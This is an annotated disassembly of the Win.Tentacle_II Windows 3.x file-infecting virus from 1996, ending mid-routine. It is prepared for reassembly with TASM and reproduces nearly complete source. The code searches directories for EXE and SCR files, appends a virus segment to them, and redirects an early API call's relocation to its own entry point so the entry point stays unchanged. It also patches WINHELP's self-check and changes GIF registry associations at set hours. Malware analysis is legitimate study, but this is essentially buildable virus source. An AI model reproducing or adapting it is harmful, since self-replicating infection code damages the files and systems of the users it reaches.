comment %

Name            : Win.Tentacle_II
Alias           : Shell
Author          : ?
Type            : direct acting Win16 NE appender
Size            : 10608 bytes virus body (because of relocation stuff
                  infected files increase for at least 10634 bytes)
Origin          : ?
When            : 1996
Status          : was in the wild (distributed in sex newsgroups in 1996)
Disassembled by : Black Jack
Contact me      : Black_Jack_VX@hotmail.com | http://www.coderz.net/blackjack

Description:
When the virus gets activated, it starts to search and infect NE EXE files,
first one *.EXE file in the current directory, then two in the C:\WINDOWS
directory, then one in some other possible hardcoded windows directories
(C:\WIN, C:\WIN31, C:\WIN311, C:\WIN95), and then one *.SCR file in the
current dir. While infection the virus creates a temporary file
C:\TENTACLE.$$$ and rebuilds there an infected image of the victim file. When
the infection process is finished this file is copied back over the victim
file and then deleted.
The infection technique is adding another segment with the virus
code at the end of the file. To add its own entry to the segment table, it
checks if there is enough unused room between the end of the NE header tables
and the start of the first segment and aborts infection if not. Then it
shifts back all tables after the segment table (therefore overwriting the
unused fill bytes) and fixes their offsets in the NE header, so that it can
write its own segment descriptor at the end of the segment table. In a similar
way it adds its own entries to the module-reference and the imported-names
table (this is necessary to import two APIs that are used in the payload).
The most interesting feature of the virus is that it was one of the first (if
not the very first) viruses using EPO techniques, that means infecting the
file without modifying its entry point. To do so, it searches the code segment
that contains the entry point for a call to the INITTASK API from KERNEL.DLL,
or, if that one is not found, the THUNRTMAIN API from VBRUN300.DLL, this are
APIs that should be in the very beginning of a program. Then the relocation
item that is associated with the API call is patched in such a way that this
call is redirected to the virus.
While infecting, the virus pays special attention to the WINHELP.EXE files.
This file contains a self-check in Win3.11. And that's why the virus patches
it in a special way, so that this self-check is disabled.
The payload is activated if the virus is run between 1:00am and 1:05am - The
virus drops a file C:\TENTACLE.GIF containing a picture of the violet tentacle
from the classical computer game "the day of the tentacle" and modifies the
registry in such a way that whenever the program associated with .GIF files
is run to view such a file it displays the file dropped by the virus. To do so
it uses two imported APIs RegSetValue and RegQueryValue from SHELL.DLL.
Additionally, if the virus is executed between 1:15am and 2:00am it runs the
opposite effect and undoes the changes in the registry that were done in the
payload.

Reassembly tested with Tasm 3.1 and TLink 3.0 .

        TASM /M tenta2
        TLINK tenta2

first generation sample is a DOS EXE file and infects all suitable EXE files
in the current directory only.

%


virus_size      EQU (offset virus_end - offset virus_start)

.model tiny
.code
.386
org 0

virus_start:
segm_offset     dw      0
segm_phys_size  dw      virus_size
segm_attribs    dw      0001110101010000b ; readable code segment with relocs
segm_virt_size  dw      virus_size


reloc_stuff:
                dd      0000FFFFh       ; pointers that will become relocated
                dd      0000FFFFh       ; must be initialised by 0000:FFFF
                dd      0000FFFFh

; This is the real start of the relocation data:
                dw      3               ; three relocation items

                db      3               ; 32bit far pointer
                db      1               ; imported ordinal
                dw      offset RegQueryValue  ; offset of relocation item
size_of_reloc_stuff1 EQU ($ - reloc_stuff)
                dw      0               ; will become module-reference index
reloc_stuff2    dw      6               ; ordinal RegQueryValue

                db      3               ; 32bit far pointer
                db      1               ; imported ordinal
                dw      offset RegSetValue  ; offset of relocation item
size_of_reloc_stuff2 EQU ($ - reloc_stuff2)
                dw      0               ; will become module-reference index
reloc_stuff3    dw      5               ; ordinal RegSetValue

                db      3               ; 32bit far pointer
                db      1               ; imported ordinal
                dw      offset org_entry; offset of relocation item
size_of_reloc_stuff3 EQU ($ - reloc_stuff3)
                dw      0               ; will become module-reference index
                dw      0               ; will become ordinal of hooked API

virus_entry:
        push    ds                      ; save DS
        pusha                           ; save all registers

        push    ss                      ; DS=SS
	pop	ds

        sub     sp,size stack_frame     ; reserve room on stack
        mov     bp,sp                   ; setup stack frame

        mov     ah,1Ah                  ; set DTA to DS:DX
        lea     dx,[bp.dta]             ; DS:DX=our DTA in our stack frame
        int     21h


	mov	bx,1
        mov     cx,offset empty_string
        mov     dx,offset exe_wildcard
        CALL    infect_directory        ; infect one EXE file in current dir

	mov	bx,2
        mov     cx,offset C_windows
        mov     dx,offset exe_wildcard
        CALL    infect_directory        ; infect two EXE files in C:\WINDOWS

	mov	bx,1
        mov     cx,offset C_win
        mov     dx,offset exe_wildcard
        CALL    infect_directory        ; infect one EXE file in C:\WIN

	mov	bx,1
        mov     cx,offset C_win31
        mov     dx,offset exe_wildcard
        CALL    infect_directory        ; infect one EXE file in C:\WIN31

	mov	bx,1
        mov     cx,offset C_win311
        mov     dx,offset exe_wildcard
        CALL    infect_directory        ; infect one EXE file in C:\WIN311

	mov	bx,1
        mov     cx,offset C_win95
        mov     dx,offset exe_wildcard
        CALL    infect_directory        ; infect one EXE file in C:\WIN95

	mov	bx,1
        mov     cx,offset empty_string
        mov     dx,offset scr_wildcard
        CALL    infect_directory        ; infect one SCR in current dir


        mov     ah,1Ah                  ; set DTA to DS:DX
        mov     dx,7Fh                  ; DX=80h (standart DTA offset)
        inc     dx
        push    ds                      ; save DS
        push    es                      ; DS=ES=PSP (or equivalent) segment
        pop     ds
        int     21h

        pop     ds                      ; restore DS

        mov     ah,2Ch                  ; get the system time to CX/DX
        int     21h                     ; CH=hours, CL=minutes, DH=seconds
                                        ; DL=1/100 seconds

        cmp     cx,100h                 ; is it before 1:00am ?
        JB      restore_host            ; if yes, no payload
        cmp     cx,105h                 ; is it before 1:05am ?
        JB      change_gif_cmdline      ; call payload between 1:00 and 1:05
        cmp     cx,10Fh                 ; is it before 1:15am ?
        JB      restore_host            ; if yes, no payload
        cmp     cx,200h                 ; is it after 2:00am ?
        JAE     restore_host            ; if yes, no payload
        mov     ax,0                    ; restore old gif commandline
        JMP     call_payload            ; call payload between 1:15 and 2:00
change_gif_cmdline:
        mov     ax,1                    ; change gif commandline to our file
call_payload:
        CALL    payload                 ; play with the gif commandline in
                                        ; the win16 "registry".

restore_host:
        add     sp,size stack_frame     ; free room on stack

        popa                            ; restore all registers
        pop     ds                      ; restore DS
        JMP     cs:org_entry            ; jump to the API that was hooked
                                        ; for the EPO while infection.


C_win   db "C:\WIN\", 0


; The following two subroutines are not used in the whole virus. I guess that
; they were just used in the first generation sample, and accidentally left
; in by the virus author. That's why I also used them in the first generation
; carrier of the disassembly.

encrypt_wildcard:
        push    si                      ; save SI
        push    di                      ; save DI
        push    es                      ; save ES

        push    ds                      ; ES=DS
	pop	es

        mov     di,si                   ; DI=SI
        xor     al,al                   ; AL=0
        mov     cx,0FFFFh               ; search whole segment
        repne   scasb                   ; search for the end of the string
        dec     di                      ; go back to the terminating zero
        mov     ax,di                   ; AX=end of string
                                        ; SI=start of string
        sub     ax,si                   ; AX=length of string

        pop     es                      ; restore ES
        pop     di                      ; restore DI

        mov     cx,ax                   ; CX=length of string

encrypt_wildcard_loop:
        inc     byte ptr [si]           ; encrypt one byte from string
        inc     si                      ; next byte
        loop    encrypt_wildcard_loop

        pop     si                      ; restore SI

        RET


encrypt_path:
        push    si                      ; save SI
        push    di                      ; save DI
        push    es                      ; save ES

        push    ds                      ; ES=DS
	pop	es

        mov     di,si                   ; DI=SI
        xor     al,al                   ; AL=0
        mov     cx,0FFFFh               ; search whole segment
        repne   scasb                   ; search for the end of the string
        dec     di                      ; go back to the terminating zero
        mov     ax,di                   ; AX=end of string
                                        ; SI=start of string
        sub     ax,si                   ; AX=length of string

        pop     es                      ; restore ES
        pop     di                      ; restore DI

        mov     cx,ax                   ; CX=length of string

encrypt_path_loop:
        dec     byte ptr [si]           ; encrypt one byte from string
        inc     si                      ; next byte
        loop    encrypt_path_loop

        pop     SI                      ; restore SI

        RET


; ----- DECRYPT PATH STRING -------------------------------------------------
; Entry:
;       SI - pointer to source buffer
;       DI - pointer to destination buffer
; Exit:
;       DI - end of destination buffer

decrypt_path:
        cld                             ; clear direction flag

        push    di                      ; save DI
        push    es                      ; save ES

        push    ds                      ; ES=DS
	pop	es

        mov     di,si                   ; DI=SI
        xor     al,al                   ; AL=0
        mov     cx,0FFFFh               ; search whole segment
        repne   scasb                   ; search for the end of the string
        dec     di                      ; go back to the terminating zero
        mov     ax,di                   ; AX=end of string
                                        ; SI=start of string
        sub     ax,si                   ; AX=length of string

        pop     es                      ; restore ES
        pop     di                      ; restore DI

        mov     cx,ax                   ; CX=length of string
        inc     cx                      ; because the LOOP immedeately follows
        JMP     loop_decrypt_path

decrypt_path_loop:
        lodsb                           ; load a byte from source string
        inc     al                      ; decrypt it
        stosb                           ; store decrypted byte
loop_decrypt_path:
        loop    decrypt_path_loop

        movsb                           ; move terminating zero
        RET



; ----- DECRYPT WINDCARD STRING ---------------------------------------------
; Entry:
;       SI - pointer to source buffer
;       DI - pointer to destination buffer
; Exit:
;       DI - end of destination buffer

decrypt_wildcard:
        cld                             ; clear direction flag

        push    di                      ; save DI
        push    es                      ; save ES

        push    ds                      ; ES=DS
	pop	es

        mov     di,si                   ; DI=SI
        xor     al,al                   ; AL=0
        mov     cx,0FFFFh               ; search whole segment
        repne   scasb                   ; search for the end of the string
        dec     di                      ; go back to the terminating zero
        mov     ax,di                   ; AX=end of string
                                        ; SI=start of string
        sub     ax,si                   ; AX=length of string

        pop     es                      ; restore ES
        pop     di                      ; restore DI

        mov     cx,ax                   ; CX=length of string
        inc     cx                      ; because the LOOP immedeately follows
        JMP     loop_decrypt_wildcard

decrypt_wildcard_loop:
        lodsb                           ; load a byte from source string
        dec     al                      ; decrypt it
        stosb                           ; store decrypted byte
loop_decrypt_wildcard:
        loop    decrypt_wildcard_loop

        movsb                           ; move terminating zero
        RET


C_windows       db "C:\WINDOWS\"
empty_string    db 0


; ----- INFECT A DIRECTORY --------------------------------------------------
;
; INPUT:
; BX - number of files to infect
; CX - ptr to path to infect (encrypted)
; DX - ptr to file wildcard ("*.EXE" or "*.SCR", also encrypted)

infect_directory:
        push    ds                      ; save DS
        push    es                      ; save ES

        push    cs                      ; DS=CS
	pop	ds

        push    ss                      ; ES=SS
	pop	es

        mov     si,cx                   ; SI=ptr to path to decrypt
        lea     di,[bp.full_filespec]   ; DI=ptr to where full wildcard will
                                        ; be stored ("C:\path\*.ext")
        push    cx                      ; save CX (pointer to path)
        CALL    decrypt_path            ; decrypt the path to full_filespec

        dec     di                      ; skip the terminating zero

	mov	si,dx
        CALL    decrypt_wildcard        ; decrypt the wilcard to full_filespec

        pop     si                      ; restore ptr to path in SI
        lea     di,[bp.full_filename]
        CALL    decrypt_path
        dec     di                      ; skip the terminating zero

        pop     es                      ; restore ES
        pop     ds                      ; restore DS

        mov     ah,4Eh                  ; find first file
        mov     cx,2                    ; normal and hidden files
        lea     dx,[bp.full_filespec]
        JMP     do_file_search

do_file:
        push    es                      ; save ES
        push    di                      ; save DI

        push    ss                      ; ES=SS
	pop	es

        cld                             ; clear direction flag
        lea     si,[bp.dta+1Eh]         ; SI=ptr to found filename in DTA
                                        ; DI points after the path in
                                        ; full_filename
        mov     cx,13                   ; 8.3 filename (zero terminated)
        rep     movsb                   ; copy filename

        pop     di                      ; restore DI
        pop     es                      ; restore ES

        test    byte ptr [bp.dta+15h],1 ; read only attribute set?
        JZ      not_readonly

        push    dx                      ; save DX

        mov     ax,3000h                ; AX=4301h (set file attributes)
        add     ax,1301h
        xor     ch,ch                   ; set high byte of attributes to zero
        mov     cl,[bp.dta+15h]         ; CL=low byte of attributes
;*      and     cx,0FFFEh               ; delete read-only attribute
        db      83h,0E1h,0FEh           ; fixup - byte match
        lea     dx,[bp.full_filename]   ; DS:DX=ptr to filename (with path)
        int     21h

        pop     dx                      ; restore DX

        JC      findnext                ; error? if so, search on

not_readonly:
        CALL    infect_file             ; infect the file!
        JC      findnext                ; on error while infecting search on!
        dec     bx                      ; decrement infection counter
        JZ      done_directory          ; enough files infected?
findnext:
        mov     ah,4Fh                  ; find next file

do_file_search:
        int     21h                     ; do the file search
        JNC     do_file                 ; if no error happened, process file

done_directory:
        RET


C_win31         db "C:\WIN31\", 0

exe_wildcard    db "*.EXE", 0
scr_wildcard    db "*.SCR", 0


; ----- INFECT THE FILE -----------------------------------------------------

infect_file:
        pushad                          ; save all 32bit registers

        mov     ax,3D00h                ; open file read-only
        lea     dx,[bp.full_filename]   ; DS:DX=pointer to filename
	int	21h
        JC      exit_infect             ; exit on error
        mov     bx,ax                   ; file handle to BX
        mov     [bp.source_handle],ax   ; save file handle

        CALL    get_file_date_time_size

        mov     ah,3Fh                  ; read DOS header
        mov     cx,64                   ; DOS header size
        lea     dx,[bp.rw_buffer]       ; Load effective addr
	int	21h
        JC      close_file

        mov     ax,word ptr [bp.rw_buffer]  ; AX=exe marker
        dec     ax                      ; anti-heuristic
        cmp     ax,"ZM"-1               ; EXE file?
        JNE     close_file              ; close if not

;*      cmp     word ptr [bp.rw_buffer+0Ch],0FFFEh  ; maxmem item in DOS
                                                ; header is infection marker
        db      81h,0BEh,0A9h,0,0FEh,0FFh       ; fixup - byte match
        JE      close_file              ; if equal, file is already infected

;*      cmp     word ptr [bp.rw_buffer+0Ch],0FFFFh  ; maxmem must be standart
        db      81h,0BEh,0A9h,0,0FFh,0FFh       ; fixup - byte match
        JNE     close_file                      ; if not, don't infect

        mov     word ptr [bp.rw_buffer+0Ch],0FFFEh  ; mark as infected
        cmp     word ptr [bp.rw_buffer+18h],40h ; new exe file?
        JB      close_file                      ; if not, then close

; set tmp_filename to "C:\TENTACLE.$$$", 0
        mov     dword ptr [bp.tmp_filename+6],0F59E6305h
        add     dword ptr [bp.tmp_filename+6],56A4DE4Fh
        mov     word ptr [bp.tmp_filename+0],":C"
        mov     dword ptr [bp.tmp_filename+10],"$$.E"
        mov     dword ptr [bp.tmp_filename+2],0B1704BC2h
        add     dword ptr [bp.tmp_filename+2],9CD5089Ah
        mov     word ptr [bp.tmp_filename+14],"$"

        mov     ah,3Ch                  ; create temporary file
        mov     cx,2                    ; with hidden attributes
        lea     dx,[bp.tmp_filename]    ; DS:DX=ptr to filename
	int	21h
        JC      close_file              ; exit on error
        mov     [bp.dest_handle],ax     ; save temp file handle

        mov     ah,40h                  ; write DOS header of temp file
        mov     bx,[bp.dest_handle]     ; BX=file handle
        mov     cx,64                   ; CX=length to write
        lea     dx,[bp.rw_buffer]       ; DS:DX=address write buffer
        int     21h
        JC      close_tmp_file

        mov     ecx,dword ptr [bp.rw_buffer+3Ch]  ; ECX=new exe header offset
        mov     [bp.new_header_offs],ecx; store it
        sub     ecx,64                  ; size of dos header (already written)
        CALL    copy_file_block         ; copy rest of DOS stub
        JC      close_tmp_file

        mov     bx,[bp.source_handle]   ; BX=handle of victim file
        mov     ah,3Fh                  ; read NE header
        mov     cx,64                   ; size of NE header
        lea     dx,[bp.rw_buffer]       ; DX=offset of buffer
	int	21h
        JC      close_tmp_file

        mov     ax,word ptr [bp.rw_buffer]  ; AX=new exe marker
        inc     ax                      ; anti-heuristic
        cmp     ax,"EN"+1               ; NE exe file?
        JNE     close_tmp_file          ; if not, then abort infection

        mov     cl,byte ptr [bp.rw_buffer+32h]  ; CL=alignment shift
        mov     eax,1                   ; EAX=1
        shl     eax,cl                  ; EAX=alignment unit
        mov     [bp.alignment_unit],eax ; save it
        mov     cl,byte ptr [bp.rw_buffer+32h]  ; CL=alignment shift
        mov     eax,[bp.file_size]      ; EAX=filesize
        shr     eax,cl                  ; EAX=filesize in alignment units
        mov     [bp.new_sect_descr+0],ax  ; save it as offset for the new
                                        ; segment that is going to be created
        mov     eax,[bp.alignment_unit] ; EAX=alignment unit
        dec     eax                     ; set all bits below alignemt
        test    eax,[bp.file_size]      ; filesize already aligned?
        JZ      filesize_already_aligned
        inc     word ptr [bp.new_sect_descr+0]  ; if not, round it up
filesize_already_aligned:
        mov     ax,cs:segm_phys_size    ; copy physical size of segment
        mov     [bp.new_sect_descr+2],ax
        mov     ax,cs:segm_attribs      ; copy segment attributes
        mov     [bp.new_sect_descr+4],ax
        mov     ax,cs:segm_virt_size    ; copy virutal size of segment
        mov     [bp.new_sect_descr+6],ax

        cmp     word ptr [bp.rw_buffer+22h],40h ;is the segment table directly
                                        ; after the NE header (standart case)?
        JNE     close_tmp_file          ; if not, better not infect the file

        CALL    EPO
        JC      close_tmp_file
        mov     [bp.module_ordinal],eax ; save module index and ordinal
        mov     [bp.our_reloc_offs],edx ; save offset of relocation item

        xor     eax,eax                 ; EAX=0
        mov     ax,word ptr [bp.rw_buffer+22h]  ; EAX=offset of segment
                                                ; descriptor table from NE hdr
        add     eax,[bp.new_header_offs]; EAX=offset of segment descriptor
                                        ; table from file start

        push    eax                     ; CX:DX=EAX
	pop	dx
	pop	cx
        mov     ax,4200h                ; go to segment descriptor table
	int	21h

        mov     ah,3Fh                  ; read the offset of the first segment
        mov     cx,2                    ; read a word
        lea     dx,[bp.first_segm_offs] ; DX=offset read buffer
	int	21h
        JC      close_tmp_file

        mov     ax,4201h                ; move file pointer relative to
                                        ; current position
        mov     cx,-1                   ; CX:DX=-2 (new filepointer position)
        mov     dx,-2
        int     21h                     ; set the filepointer back to the
                                        ; start of the segment table
        JC      close_tmp_file

        xor     eax,eax                 ; EAX=0
        mov     ax,word ptr [bp.first_segm_offs]  ; EAX=aligned file offset
                                                  ; of first segment
        mul     [bp.alignment_unit]     ; EAX=file offset of the 1st segment
        mov     [bp.first_segm_offs],eax; save it

        mov     ebx,dword ptr [bp.rw_buffer+2Ch]
        ; EBX=beginning of the nonresident-name table (relative to filestart).
        ; This should be the last table in the NE header.

        xor     ecx,ecx                         ; ECX=0
        mov     cx,word ptr [bp.rw_buffer+20h]  ; ECX=size of nonresident name
                                                ; table in bytes
        add     ebx,ecx                 ; EBX=size of NE header + all tables
        mov     dword ptr [bp.end_of_NE_hdr],ebx

        sub     eax,ebx                 ; EAX=free room between the end of
                                        ; the NE header and the first segment

;*      cmp     eax,10h                 ; is there enough room left so we can
                                        ; add our stuff (a segment descriptor,
                                        ; a module reference and an imported
                                        ; name) ?
        db      66h,83h,0F8h,10h        ; fixup - byte match
        JL      close_tmp_file          ; if not, we can't infect the file

        mov     ax,word ptr [bp.rw_buffer+1Ch]  ; segment count
        inc     ax                              ; add another segment
        mov     word ptr [bp.rw_buffer+1Ch],ax  ; save new segment count
        mov     word ptr [bp.new_entry_CS],ax   ; new entry segment index
        mov     word ptr [bp.new_entry_IP],offset virus_entry   ; set new
                                                                ; entry IP
        and     byte ptr [bp.rw_buffer+37h],011110111b  ; windows flags:
                                                        ; kill gangload area

; fixup the offsets of the other NE header tables (all are after the segment
; table and therefore shifted back). It is assumed that all tables are in the
; same order in the file as their offsets are stored in the NE header (except
; for the entry table, which should be the second last).

        add     word ptr [bp.rw_buffer+4h],16   ; entry table
        add     word ptr [bp.rw_buffer+24h],8   ; resource table
        add     word ptr [bp.rw_buffer+26h],8   ; resident-name table
        add     word ptr [bp.rw_buffer+28h],8   ; module-reference table
        add     word ptr [bp.rw_buffer+2Ah],10  ; imported-name table
        add     dword ptr [bp.rw_buffer+2Ch],16 ; nonresident-name table

        inc     word ptr [bp.rw_buffer+1Eh]     ; one more entry in
                                                ; module-reference table

        mov     ah,40h                  ; write modified NE header to tmp file
        mov     bx,[bp.dest_handle]     ; BX=temp file handle
        mov     cx,64                   ; NE header size
        lea     dx,[bp.rw_buffer]       ; DX=write buffer offset
	int	21h
        JC      close_tmp_file

        xor     ecx,ecx                 ; ECX=0
        mov     cx,word ptr [bp.rw_buffer+1Ch]  ; EAX=number of segments
        dec     cx                      ; ECX=old number of segments
        shl     cx,3                    ; shl 3 means mul 8 (size of a
                                        ; segment descriptor)
                                        ; ECX=old size of segm descriptor tbl
        CALL    copy_file_block         ; copy segment descriptor table
        JC      close_tmp_file

        mov     ah,40h                  ; write our own segment descriptor
                                        ; to the file
        mov     cx,8                    ; size of a segment descriptor
        lea     dx,[bp.new_sect_descr]  ; DX=offset of write buffer
	int	21h
        JC      close_tmp_file

        xor     ecx,ecx                 ; ECX=0
        mov     cx,word ptr [bp.rw_buffer+2Ah]  ; ECX=offset of imported-name
                                                ; table from NE header
        mov     ax,word ptr [bp.rw_buffer+1Ch]  ; entries in segment table
        dec     ax                      ; AX=old number of segments
        shl     ax,3                    ; multiply with 8 (size of a
                                        ; segment descriptor)
        add     ax,word ptr [bp.rw_buffer+22h]  ; add offset of segment table
                                                ; (from NE header)
                                        ; AX=offset end of segment table
                                        ; relative to the NE header
        sub     cx,ax                   ; CX=length of stuff between the
                                        ; segment table and the imported-name
                                        ; table (resource, resident-name and
                                        ; module-reference tables)
        sub     cx,10                   ; because the imported-name table
                                        ; offset has already been increased
                                        ; by 10 before
        CALL    copy_file_block         ; copy all those tables
        JC      close_tmp_file

        mov     ax,word ptr [bp.rw_buffer+4]    ; offset entry table (from
                                                ; NE header)
        sub     ax,6                    ; AX=end of old imported-name table

        sub     ax,word ptr [bp.rw_buffer+2Ah]  ; ECX=offset of imported-name
                                                ; table from NE header
        mov     word ptr [bp.tmp_buffer],ax     ; AX=offset into imported-name
                                                ; table (the one of the module
                                                ; name we're going to add)

        mov     ah,40h                  ; append our new entry into the
                                        ; module reference table, the offset
                                        ; of the new module name
        mov     cx,2                    ; write one word
        lea     dx,[bp.tmp_buffer]      ; DS:DX=pointer to write buffer
	int	21h
        JC      close_tmp_file

        xor     ecx,ecx                 ; ECX=0
        mov     cx,word ptr [bp.rw_buffer+4] ; offset entry table (from
                                             ; NE header)
        sub     cx,6                    ; CX=end of old imported-name table
        sub     cx,word ptr [bp.rw_buffer+2Ah]  ; offset of imported-names
                                                ; table from NE header
        CALL    copy_file_block         ; copy imported-name table
        JC      close_tmp_file

        mov     ah,40h                  ; append our module name to the
                                        ; imported-name table
        mov     cx,6                    ; length to write
        mov     word ptr [bp.tmp_buffer+4],"LL"         ; create the string
        mov     dword ptr [bp.tmp_buffer],6DBBFE87h     ; 5, "SHELL"
        add     dword ptr [bp.tmp_buffer],0D78C547Eh    ; in tmp_buffer
        lea     dx,[bp.tmp_buffer]      ; DS:DX=pointer to write buffer
	int	21h
        JC      close_tmp_file

        mov     cx,word ptr [bp.end_of_NE_hdr]  ; end of NE header+all tables
                                                ; (offset from filestart
        sub     cx,word ptr [bp.rw_buffer+4]    ; offset entry table (from
                                                ; NE header)
        add     cx,word ptr [bp.new_header_offs]; BUG! this should be a sub,
                                                ; no add! but because the
                                                ; filepointer is set new
                                                ; immedeately afterwards, this
                                                ; never causes any problems.
        CALL    copy_file_block         ; copy the rest of the header
                                        ; (entry and nonresident-name tables)
        JC      close_tmp_file

        mov     ax,4200h                ; set filepointer in the destination
                                        ; (temp) file to the start of the
                                        ; first segment.
        push    dword ptr [bp.first_segm_offs]
        pop     dx                      ; CX:DX=first segment offset
	pop	cx
	int	21h
        JC      close_tmp_file

        mov     ax,4200h                ; set filepointer in the source file
                                        ; to the start of the first segment
        mov     bx,[bp.source_handle]
        push    dword ptr [bp.first_segm_offs]
        pop     dx                      ; CX:DX=first segment offset
	pop	cx
	int	21h
        JC      close_tmp_file

        mov     ecx,0FFFFFFFFh          ; whole file body
        CALL    copy_file_block         ; copy the file body (all segments
                                        ; and relocations)
        JC      close_tmp_file

        xor     eax,eax                 ; EAX=0
        mov     ax,[bp.new_sect_descr+0]; EAX=aligned offset of our segment
        mov     cl,byte ptr [bp.rw_buffer+32h]  ; CL=alignment shift
        shl     eax,cl                  ; EAX=offset of our segment in bytes

        push    eax                     ; CX:DX=EAX
	pop	dx
	pop	cx
        mov     ax,4200h                ; go to our segment offset in file
        mov     bx,[bp.dest_handle]     ; BX=temp file handle
	int	21h
        JC      close_tmp_file

        mov     ah,40h                  ; write virus body to file
        mov     cx,(RegQueryValue-virus_start) ; write whole virus body
                                        ; excluding the three pointers that
                                        ; must be relocated and therefore
                                        ; initialised with 0000:FFFF
        mov     dx,offset virus_start   ; DX=offset write buffer=virus body
        push    ds                      ; save DS
        push    cs                      ; DS=CS
	pop	ds
	int	21h

        pop     ds                      ; restore DS
        JC      close_tmp_file

        mov     ah,40h                  ; write relocation stuff
        mov     cx,size_of_reloc_stuff1 ; size of relocation stuff
        mov     dx,offset reloc_stuff   ; DX=offset write buffer
        push    ds                      ; save DS
        push    cs                      ; DS=CS
	pop	ds
	int	21h

        pop     ds                      ; restore DS
        JC      close_tmp_file

        mov     ah,40h                  ; write module index
        mov     cx,2                    ; one word
        lea     dx,ss:[bp.rw_buffer+1Eh]; number of entries in module
                                        ; reference table - our module
                                        ; reference is the last
	int	21h
        JC      close_tmp_file

        mov     ah,40h                  ; write relocation stuff
        mov     cx,size_of_reloc_stuff2 ; size of relocation stuff
        mov     dx,offset reloc_stuff2  ; DX=offset write buffer
        push    ds                      ; save DS
        push    cs                      ; DS=CS
	pop	ds
	int	21h

        pop     ds                      ; restore DS
        JC      close_tmp_file

        mov     ah,40h                  ; write module index
        mov     cx,2                    ; one word
        lea     dx,ss:[bp.rw_buffer+1Eh]; number of entries in module
                                        ; reference table - our module
                                        ; reference is the last
	int	21h
        JC      close_tmp_file

        mov     ah,40h                  ; write relocation stuff
        mov     cx,size_of_reloc_stuff3 ; size of relocation stuff
        mov     dx,offset reloc_stuff3  ; DX=offset write buffer
        push    ds                      ; save DS
        push    cs                      ; DS=CS
	pop	ds
	int	21h

	pop	ds
        JC      close_tmp_file

        mov     ah,40h                  ; write the reference to the API
                                        ; we hooked for the EOP
        mov     cx,2                    ; CX=4 (size to write)
        shl     cx,1                    ; ???
        lea     dx,[bp.module_ordinal]  ; DS:DX=pointer to write buffer
	int	21h
        JC      close_tmp_file

        push    [bp.our_reloc_offs]     ; CX:DX=offset of the relocation item
        pop     dx                      ; that has to be modifies
	pop	cx
        mov     ax,4200h                ; set filepointer relative to
        int     21h                     ; filestart
        JC      close_tmp_file

        mov     ah,40h                  ; write relocation type
        mov     cx,2                    ; one word
        mov     word ptr [bp.tmp_buffer],3 ; 32bit far ptr/internal reference
        lea     dx,[bp.tmp_buffer]      ; DS:DX=pointer to write buffer
	int	21h
        JC      close_tmp_file

        mov     ax,4201h                ; set new file pointer relative to
                                        ; current position
        mov     cx,0                    ; CX:DX=2 (skip the offset of the
        mov     dx,2                    ; dword that must be relocated)
	int	21h
        JC      close_tmp_file

        mov     ah,40h                  ; write a far pointer to the virus
                                        ; entrypoint.
        mov     cx,2                    ; CX=4 (size to write)
        shl     cx,1                    ; ???
        lea     dx,[bp.new_entry_CS]    ; DS:DX=pointer to write buffer
	int	21h
        JC      close_tmp_file

        cmp     dword ptr [bp.dta+24h],"XE.P"  ; check the filename of the
        JNE     not_winhelp              ; victim for "WINHELP.EXE" and try to
        mov     eax,dword ptr [bp.dta+20h]         ; patch it if the filename matches
	add	eax,98F5548Ah
        cmp     eax,"LEHN"+98F5548Ah
        JNE     not_winhelp
        cmp     word ptr [bp.dta+28h],"E"
        JNE     not_winhelp
        cmp     word ptr [bp.dta+1Eh],"IW"
        JNE     not_winhelp
        CALL    patch_winhelp
not_winhelp:

        mov     ah,3Eh                  ; close temp file
	int	21h

        mov     bx,[bp.source_handle]   ; BX=victim file handle
        mov     ah,3Eh                  ; close victim file
	int	21h

        lea     dx,[bp.tmp_filename]    ; DS:DX=pointer to temp file name
        mov     ax,3D00h                ; reopen temp file read-only
	int	21h

        JC      delete_tmp_file
        mov     [bp.source_handle],ax   ; save handle

        mov     ah,3Ch                  ; truncate victim file
        mov     cx,0                    ; no attributes
        lea     dx,[bp.full_filename]   ; DS:DX=ptr to full victim filename
	int	21h
        JC      delete_tmp_file

        mov     bx,ax                   ; handle to BX
        mov     [bp.dest_handle],ax     ; save handle

        mov     ecx,0FFFFFFFFh          ; copy the whole temp file over the
        CALL    copy_file_block         ; victim file

        mov     ax,3000h                ; AX=5701h - set file date and time
	add	ax,2701h
        mov     bx,[bp.dest_handle]     ; BX=handle of victim file
        mov     dx,[bp.file_date]       ; CX=old file date
        mov     cx,[bp.file_time]       ; DX=old file time
	int	21h

        mov     ah,3Eh                  ; close victim file
	int	21h

        mov     bx,[bp.source_handle]   ; BX=handle of temp file
        mov     ah,3Eh                  ; close temp file
	int	21h

        lea     dx,[bp.tmp_filename]    ; DS:DX=pointer to temp file name
        mov     ah,41h                  ; delete temp file
	int	21h

        clc                             ; clear carry flag (indicate success)
        JMP     exit_infect

close_tmp_file:
        mov     bx,[bp.dest_handle]     ; BX=handle of temp file
        mov     ah,3Eh                  ; close temp file
	int	21h

delete_tmp_file:
        lea     dx,[bp.tmp_filename]    ; DS:DX=pointer to temp file name
        mov     ah,41h                  ; delete temp file
	int	21h

close_file:
        mov     bx,[bp.source_handle]   ; BX=handle of victim file
        mov     ah,3Eh                  ; close fictim file
	int	21h

        stc                             ; set carry flag (indicate error)

exit_infect:
        popad                           ; restore all 32bit registers
        RET


C_win311 db "C:\WIN311\", 0


; ----- GET DATE, TIME AND SIZE OF THE OPENED FILE --------------------------

get_file_date_time_size:
        push    cx                      ; save CX and DX
	push	dx

        mov     ax,5700h                ; get date and time
	int	21h

        mov     [bp.file_date],dx       ; save date
        mov     [bp.file_time],cx       ; save time

        xor     cx,cx                   ; CX:DX=0 (distance to move)
        xor     dx,dx
        mov     ax,4202h                ; move filepointer relative to
        int     21h                     ; end of file
                                        ; in DX:AX the new filpointer is
                                        ; returned (filesize in this case)

        mov     word ptr [bp.file_size+2],dx    ; save filesize
        mov     word ptr [bp.file_size],ax

        xor     cx,cx                   ; DX:CX=0 (distance to move)
        xor     dx,dx
        mov     ax,4200h                ; move filepointer relative to
        int     21h                     ; beginning of file

        pop     dx                      ; restore DX and CX
	pop	cx

        RET


C_win95 db "C:\WIN95\", 0


; ----- COPY ECX BYTES FROM VICTIM FILE TO TEMP FILE ------------------------

copy_file_block:
	pushad                          ; save all 32bit registers
        sub     sp,256                  ; allocate a 256 byte buffer from stack
        mov     [bp.bytes_to_copy],ecx  ; save length of block to copy
        mov     dx,sp                   ; DX=offset buffer

copy_file_block_loop:
        cmp     [bp.bytes_to_copy],0    ; whole block moved?
        JE      copy_file_block_done    ; then we're done
